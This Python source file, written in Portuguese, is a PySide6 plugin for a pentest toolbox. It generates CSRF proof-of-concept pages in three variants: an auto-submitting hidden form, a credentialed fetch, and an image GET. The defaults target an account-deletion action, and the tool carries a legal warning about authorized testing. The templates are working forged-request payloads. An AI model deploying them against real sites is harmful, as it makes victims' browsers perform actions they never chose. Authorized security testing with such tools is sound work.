"""Ferramenta de geração de Provas de Conceito (PoC) de CSRF.

Produz três variantes de página HTML para demonstrar a viabilidade de um ataque
de Cross-Site Request Forgery: formulário com envio automático, requisição via
``fetch`` e imagem com parâmetros GET. O HTML gerado contém aviso legal visível e
não executa nenhuma requisição sozinho enquanto estiver apenas na prévia da
ferramenta.
"""
from __future__ import annotations

import json
from dataclasses import dataclass
from html import escape
from typing import List, Optional, Sequence, Tuple
from urllib.parse import urlencode

from PySide6.QtWidgets import (
    QApplication,
    QComboBox,
    QFileDialog,
    QHBoxLayout,
    QHeaderView,
    QLabel,
    QLineEdit,
    QPlainTextEdit,
    QPushButton,
    QTableWidget,
    QTextBrowser,
    QWidget,
)

from wintoolbox.core.registry import Tool, register
from wintoolbox.tools._helpers import validar_url
from wintoolbox.tools._widgets import (
    PainelFerramenta,
    adicionar_log_painel,
    criar_aviso,
    criar_card,
    criar_saida_texto,
    criar_tabela,
    mostrar_erro,
    preencher_tabela,
)

TEXTO_AVISO = (
    "Aviso legal: os arquivos gerados por esta ferramenta são Provas de Conceito (PoC) "
    "destinadas exclusivamente a testes de segurança autorizados. Utilize apenas em "
    "aplicações das quais você é proprietário ou para as quais possui autorização "
    "expressa e por escrito. Publicar ou executar uma PoC contra sistemas de terceiros "
    "pode configurar crime previsto na Lei 12.737/2012 e violar a Lei 13.709/2018 "
    "(LGPD). O aviso também é incluído no HTML gerado, de forma visível."
)

TEXTO_LEGAL_HTML = (
    "Este arquivo é uma Prova de Conceito (PoC) de CSRF gerada para testes de "
    "segurança autorizados. Use somente em aplicações próprias ou com autorização "
    "expressa e por escrito. A execução contra sistemas de terceiros pode configurar "
    "crime (Lei 12.737/2012) e violar a LGPD (Lei 13.709/2018)."
)


def validar_campos(texto: str) -> List[Tuple[str, str]]:
    """Converte linhas ``nome=valor`` em pares validados, preservando a ordem."""
    campos: List[Tuple[str, str]] = []
    for numero, linha in enumerate(str(texto or "").splitlines(), start=1):
        limpa = linha.strip()
        if not limpa or limpa.startswith("#"):
            continue
        if "=" not in limpa:
            raise ValueError(
                f"Linha {numero} inválida: use o formato nome=valor. Recebido: {limpa!r}"
            )
        nome, valor = limpa.split("=", 1)
        nome = nome.strip()
        if not nome:
            raise ValueError(f"Linha {numero} sem nome de campo.")
        campos.append((nome, valor.strip()))
    if not campos:
        raise ValueError("Informe pelo menos um campo no formato nome=valor.")
    return campos


def construir_query(campos: Sequence[Tuple[str, str]]) -> str:
    """Codifica os campos como application/x-www-form-urlencoded."""
    return urlencode([(nome, valor) for nome, valor in campos], doseq=False)


def construir_url_get(url: str, campos: Sequence[Tuple[str, str]]) -> str:
    """Anexa os campos como parâmetros de consulta à URL informada."""
    consulta = construir_query(campos)
    if not consulta:
        return url
    separador = "&" if "?" in url else "?"
    return f"{url}{separador}{consulta}"


def _aviso_html() -> str:
    """Bloco visível de aviso legal incluído em todas as PoCs."""
    return (
        '<div style="border:2px solid #dc2626;background:#fef2f2;color:#7f1d1d;'
        'padding:12px;border-radius:6px;font-family:Arial,sans-serif;font-size:13px;'
        'line-height:1.45;margin-bottom:16px;">'
        "<strong>Aviso legal:</strong> "
        f"{escape(TEXTO_LEGAL_HTML)}"
        "</div>"
    )


def _comentario_legal() -> str:
    """Comentário HTML com o aviso legal, útil mesmo quando o corpo é reduzido."""
    return (
        "<!--\n"
        "  PROVA DE CONCEITO (PoC) DE CSRF - WinToolbox\n"
        "  Uso permitido apenas em sistemas próprios ou com autorização expressa.\n"
        "  A execução não autorizada pode configurar crime (Lei 12.737/2012) e\n"
        "  violar a LGPD (Lei 13.709/2018).\n"
        "-->\n"
    )


def _entradas_ocultas(campos: Sequence[Tuple[str, str]]) -> str:
    """Monta os campos ocultos do formulário com escape de atributos."""
    linhas: List[str] = []
    for nome, valor in campos:
        linhas.append(
            '      <input type="hidden" name="{}" value="{}">'.format(
                escape(nome, quote=True), escape(valor, quote=True)
            )
        )
    return "\n".join(linhas)


def _documento(titulo: str, corpo: str) -> str:
    """Envolve o corpo em um documento HTML completo em português."""
    return (
        "<!DOCTYPE html>\n"
        '<html lang="pt-BR">\n'
        "<head>\n"
        '  <meta charset="utf-8">\n'
        f"  <title>{escape(titulo)}</title>\n"
        "</head>\n"
        "<body style=\"font-family:Arial,sans-serif;margin:24px;\">\n"
        f"{_comentario_legal()}"
        f"{_aviso_html()}\n"
        f"{corpo}\n"
        "</body>\n"
        "</html>\n"
    )


def gerar_poc_autosubmit(
    url: str,
    campos: Sequence[Tuple[str, str]],
    metodo: str = "POST",
    *,
    titulo: str = "PoC de CSRF - envio automático",
    texto_botao: str = "Enviar requisição",
) -> str:
    """Gera uma PoC com formulário oculto e envio automático via JavaScript."""
    metodo = "POST" if str(metodo).upper() == "POST" else "GET"
    url_final = url if metodo == "POST" else construir_url_get(url, campos)
    corpo = (
        f"  <h1>{escape(titulo)}</h1>\n"
        "  <p>Esta página envia uma requisição forjada assim que for aberta.</p>\n"
        '  <form id="poc-csrf" action="{}" method="{}" target="_self">\n'
        "{}\n"
        '      <input type="submit" value="{}">\n'
        "  </form>\n"
        "  <script>\n"
        '    document.getElementById("poc-csrf").submit();\n'
        "  </script>\n"
        "  <noscript>\n"
        "    <p>O envio automático requer JavaScript. Use o botão acima para enviar manualmente.</p>\n"
        "  </noscript>\n"
    ).format(
        escape(url_final, quote=True),
        metodo,
        _entradas_ocultas(campos) if metodo == "POST" else "",
        escape(texto_botao, quote=True),
    )
    return _documento(titulo, corpo)


def gerar_poc_fetch(
    url: str,
    campos: Sequence[Tuple[str, str]],
    metodo: str = "POST",
    *,
    titulo: str = "PoC de CSRF - requisição fetch",
) -> str:
    """Gera uma PoC que dispara a requisição usando a API fetch do navegador."""
    metodo = "POST" if str(metodo).upper() == "POST" else "GET"
    corpo_requisicao = construir_query(campos)
    if metodo == "GET":
        url_final = construir_url_get(url, campos)
    else:
        url_final = url
    script = (
        "  <h1>{titulo}</h1>\n"
        "  <p>Esta página dispara uma requisição assíncrona usando fetch.</p>\n"
        "  <pre id=\"resultado\" style=\"color:#374151;\"></pre>\n"
        "  <script>\n"
        "    fetch({url}, {{\n"
        "      method: {metodo},\n"
        "      mode: \"no-cors\",\n"
        "      credentials: \"include\",\n"
        "      headers: {{ \"Content-Type\": \"application/x-www-form-urlencoded\" }},\n"
        "      body: {corpo}\n"
        "    }}).then(function () {{\n"
        "      document.getElementById(\"resultado\").textContent = \"Requisição enviada.\";\n"
        "    }}).catch(function (erro) {{\n"
        "      document.getElementById(\"resultado\").textContent = \"Falha ao enviar: \" + erro;\n"
        "    }});\n"
        "  </script>\n"
    ).format(
        titulo=escape(titulo),
        url=_js_string(url_final),
        metodo=_js_string(metodo),
        corpo=_js_string(corpo_requisicao) if metodo == "POST" else _js_string(""),
    )
    return _documento(titulo, script)


def gerar_poc_img(
    url: str,
    campos: Sequence[Tuple[str, str]],
    metodo: str = "GET",
    *,
    titulo: str = "PoC de CSRF - imagem GET",
) -> str:
    """Gera uma PoC baseada em imagem; funciona apenas com requisições GET."""
    metodo_solicitado = "POST" if str(metodo).upper() == "POST" else "GET"
    url_final = construir_url_get(url, campos)
    observacao = ""
    if metodo_solicitado == "POST":
        observacao = (
            "  <p><strong>Atenção:</strong> o método informado era POST, mas a variante "
            "de imagem só realiza requisições GET. Os campos foram convertidos em "
            "parâmetros de consulta.</p>\n"
        )
    corpo = (
        f"  <h1>{escape(titulo)}</h1>\n"
        f"{observacao}"
        "  <p>A imagem abaixo carrega a URL com os parâmetros forjados.</p>\n"
        '  <img src="{}" alt="Conteúdo" width="1" height="1" style="display:block;">\n'
        '  <p>Se a aplicação aceitar GET para a ação, ela será executada ao carregar a página.</p>\n'
    ).format(escape(url_final, quote=True))
    return _documento(titulo, corpo)


def _js_string(valor: str) -> str:
    """Serializa uma string para uso seguro dentro de um literal JavaScript."""
    return json.dumps(valor, ensure_ascii=False)


@dataclass
class VariantePoC:
    """Uma variante de PoC de CSRF pronta para prévia, cópia ou gravação."""

    nome: str
    metodo: str
    descricao: str
    html: str

    def para_linha(self) -> List[str]:
        """Converte a variante para a linha exibida na tabela."""
        return [self.nome, self.metodo, self.descricao]


def gerar_todos_pocs(
    url: str,
    campos: Sequence[Tuple[str, str]],
    metodo: str = "POST",
) -> List[VariantePoC]:
    """Gera as três variantes de PoC para a URL e os campos informados."""
    alvo = validar_url(url, permitir_local=True)
    if not campos:
        raise ValueError("Informe pelo menos um campo para a PoC.")
    metodo_normalizado = "POST" if str(metodo).upper() == "POST" else "GET"

    return [
        VariantePoC(
            nome="Formulário com envio automático",
            metodo=metodo_normalizado,
            descricao=(
                "Formulário oculto que chama submit() assim que a página é aberta. "
                "Funciona também sem JavaScript por meio do botão manual."
            ),
            html=gerar_poc_autosubmit(alvo, campos, metodo_normalizado),
        ),
        VariantePoC(
            nome="Requisição fetch",
            metodo=metodo_normalizado,
            descricao=(
                "Requisição assíncrona com credenciais incluídas. Produz menos "
                "navegação visível e depende da política de CORS do alvo."
            ),
            html=gerar_poc_fetch(alvo, campos, metodo_normalizado),
        ),
        VariantePoC(
            nome="Imagem GET",
            metodo="GET",
            descricao=(
                "Carregamento de imagem com os parâmetros na URL. Simples e "
                "silencioso, porém limitado a ações que aceitam GET."
            ),
            html=gerar_poc_img(alvo, campos, metodo_normalizado),
        ),
    ]


def salvar_poc(caminho: str, conteudo: str) -> None:
    """Grava o HTML da PoC em disco usando UTF-8."""
    with open(caminho, "w", encoding="utf-8", newline="") as arquivo:
        arquivo.write(conteudo)


@register
class CsrfPocTool(Tool):
    """Ferramenta de geração de Provas de Conceito de CSRF."""

    id = "web.csrf_poc"
    name = "Gerador de PoC CSRF"
    category = "Web"
    description = (
        "Gera três variantes de Prova de Conceito de CSRF (envio automático, fetch e "
        "imagem GET) com aviso legal no HTML, prévia, cópia e gravação em arquivo"
    )
    keywords = [
        "csrf",
        "xsrf",
        "poc",
        "prova de conceito",
        "cross-site request forgery",
        "formulário",
        "formulario",
        "segurança",
        "seguranca",
        "web",
        "pentest",
    ]

    def build_view(self, parent: Optional[QWidget] = None) -> QWidget:
        """Cria a página da ferramenta."""
        return CsrfPocView(self, parent)


class CsrfPocView(PainelFerramenta):
    """Interface de configuração, prévia e gravação das PoCs de CSRF."""

    def __init__(self, tool: CsrfPocTool, parent: Optional[QWidget] = None) -> None:
        super().__init__(tool, parent)
        self._variantes: List[VariantePoC] = []
        self._construir_interface()

    def _construir_interface(self) -> None:
        """Monta todos os cartões e controles da página."""
        self.adicionar(criar_aviso(TEXTO_AVISO, self, destaque=True))

        cartao_alvo, layout_alvo = criar_card("Alvo e campos da requisição", self)
        self.adicionar(cartao_alvo)

        linha_alvo = QHBoxLayout()
        linha_alvo.setSpacing(8)
        linha_alvo.addWidget(QLabel("URL do alvo:"))
        self.txt_url = QLineEdit("https://exemplo.com/conta/excluir")
        self.txt_url.setPlaceholderText("https://exemplo.com/acao")
        linha_alvo.addWidget(self.txt_url, stretch=1)
        linha_alvo.addWidget(QLabel("Método:"))
        self.cmb_metodo = QComboBox()
        self.cmb_metodo.addItems(["POST", "GET"])
        linha_alvo.addWidget(self.cmb_metodo)
        self.btn_gerar = QPushButton("Gerar as 3 variantes")
        self.btn_gerar.setProperty("class", "primary")
        self.btn_gerar.clicked.connect(self._gerar)
        linha_alvo.addWidget(self.btn_gerar)
        self.btn_limpar = QPushButton("Limpar")
        self.btn_limpar.clicked.connect(self._limpar)
        linha_alvo.addWidget(self.btn_limpar)
        layout_alvo.addLayout(linha_alvo)

        layout_alvo.addWidget(
            QLabel("Campos da requisição (um por linha, no formato nome=valor):")
        )
        self.txt_campos = QPlainTextEdit("usuario=admin\naction=excluir\nconfirmar=1")
        self.txt_campos.setFixedHeight(110)
        layout_alvo.addWidget(self.txt_campos)

        self.lbl_orientacao = QLabel(
            "As três variantes usam os mesmos campos. Linhas iniciadas por # são ignoradas."
        )
        self.lbl_orientacao.setProperty("class", "secondary")
        self.lbl_orientacao.setWordWrap(True)
        layout_alvo.addWidget(self.lbl_orientacao)

        _, layout_tabela = self.adicionar_card("Variantes geradas")
        self.tabela: QTableWidget = criar_tabela(["Variante", "Método", "Descrição"])
        cabecalho = self.tabela.horizontalHeader()
        cabecalho.setSectionResizeMode(0, QHeaderView.ResizeToContents)
        cabecalho.setSectionResizeMode(1, QHeaderView.ResizeToContents)
        cabecalho.setSectionResizeMode(2, QHeaderView.Stretch)
        self.tabela.setMinimumHeight(110)
        layout_tabela.addWidget(self.tabela)
        self.tabela.itemSelectionChanged.connect(self._ao_selecionar_variante)

        _, layout_previa = self.adicionar_card("Prévia do HTML gerado")
        self.previa = QTextBrowser()
        self.previa.setOpenExternalLinks(False)
        self.previa.setMinimumHeight(260)
        self.previa.setHtml(
            '<div style="color:#9ca3af;font-size:11px;">'
            "Clique em 'Gerar as 3 variantes' para visualizar a PoC selecionada.</div>"
        )
        layout_previa.addWidget(self.previa)

        _, layout_resumo = self.adicionar_card("Resumo e exportação")
        self.saida = criar_saida_texto(110)
        self.saida.setPlainText(
            "O resumo das variantes geradas será exibido aqui."
        )
        layout_resumo.addWidget(self.saida)

        linha_botoes = QHBoxLayout()
        self.btn_copiar = QPushButton("Copiar HTML")
        self.btn_copiar.setEnabled(False)
        self.btn_copiar.clicked.connect(self._copiar)
        linha_botoes.addWidget(self.btn_copiar)
        self.btn_salvar = QPushButton("Salvar HTML...")
        self.btn_salvar.setEnabled(False)
        self.btn_salvar.clicked.connect(self._salvar)
        linha_botoes.addWidget(self.btn_salvar)
        linha_botoes.addStretch(1)
        layout_resumo.addLayout(linha_botoes)

        self._log = adicionar_log_painel(self, "Log de geração")
        self.adicionar_espaco()

    def _gerar(self) -> None:
        """Valida a entrada e gera as três variantes de PoC."""
        try:
            url = validar_url(self.txt_url.text(), permitir_local=True)
            campos = validar_campos(self.txt_campos.toPlainText())
            variantes = gerar_todos_pocs(url, campos, self.cmb_metodo.currentText())
        except ValueError as exc:
            mostrar_erro(self, "Parâmetros inválidos", exc)
            return

        self._variantes = variantes
        preencher_tabela(self.tabela, [variante.para_linha() for variante in variantes])
        self.tabela.selectRow(0)
        self.btn_copiar.setEnabled(True)
        self.btn_salvar.setEnabled(True)

        linhas = [
            f"URL do alvo: {url}",
            f"Método: {self.cmb_metodo.currentText()}",
            f"Campos informados: {len(campos)}",
            "",
            "Variantes geradas:",
        ]
        for variante in variantes:
            linhas.append(
                f"  - {variante.nome} ({variante.metodo}): {len(variante.html)} caracteres"
            )
        self.saida.setPlainText("\n".join(linhas))
        self._log.append_log(
            "SUCESSO", f"{len(variantes)} variante(s) de PoC geradas para {url}."
        )
        self.previa.setHtml(variantes[0].html)

    def _ao_selecionar_variante(self) -> None:
        """Atualiza a prévia conforme a variante selecionada na tabela."""
        linhas = self.tabela.selectionModel().selectedRows()
        if not linhas:
            return
        indice = linhas[0].row()
        if 0 <= indice < len(self._variantes):
            self.previa.setHtml(self._variantes[indice].html)

    def _variante_selecionada(self) -> Optional[VariantePoC]:
        """Devolve a variante selecionada ou ``None`` quando não houver seleção."""
        linhas = self.tabela.selectionModel().selectedRows()
        if not linhas:
            return None
        indice = linhas[0].row()
        if 0 <= indice < len(self._variantes):
            return self._variantes[indice]
        return None

    def _copiar(self) -> None:
        """Copia o HTML da variante selecionada para a área de transferência."""
        variante = self._variante_selecionada()
        if variante is None:
            mostrar_erro(
                self,
                "Nenhuma variante selecionada",
                "Selecione uma linha da tabela de variantes.",
            )
            return
        QApplication.clipboard().setText(variante.html)
        self._log.append_log("INFO", f"HTML de '{variante.nome}' copiado.")

    def _salvar(self) -> None:
        """Solicita o destino e grava o HTML da variante selecionada."""
        variante = self._variante_selecionada()
        if variante is None:
            mostrar_erro(
                self,
                "Nenhuma variante selecionada",
                "Selecione uma linha da tabela de variantes.",
            )
            return
        sugestao = "poc_csrf_autosubmit.html"
        if "fetch" in variante.nome.lower():
            sugestao = "poc_csrf_fetch.html"
        elif "imagem" in variante.nome.lower():
            sugestao = "poc_csrf_img.html"

        destino, _ = QFileDialog.getSaveFileName(
            self,
            "Salvar Prova de Conceito",
            sugestao,
            "Página HTML (*.html);;Todos os arquivos (*.*)",
        )
        if not destino:
            return
        try:
            salvar_poc(destino, variante.html)
        except OSError as exc:
            mostrar_erro(self, "Falha ao salvar", exc)
            return
        self._log.append_log("SUCESSO", f"PoC salva em {destino}.")
        self.saida.setPlainText(
            f"PoC '{variante.nome}' salva em {destino}. "
            "O aviso legal está incluído no arquivo gerado."
        )

    def _limpar(self) -> None:
        """Limpa os resultados e restaura o estado inicial da página."""
        self._variantes = []
        self.tabela.setRowCount(0)
        self.previa.setHtml(
            '<div style="color:#9ca3af;font-size:11px;">'
            "Clique em 'Gerar as 3 variantes' para visualizar a PoC selecionada.</div>"
        )
        self.saida.setPlainText("O resumo das variantes geradas será exibido aqui.")
        self.btn_copiar.setEnabled(False)
        self.btn_salvar.setEnabled(False)
        self._log.clear()
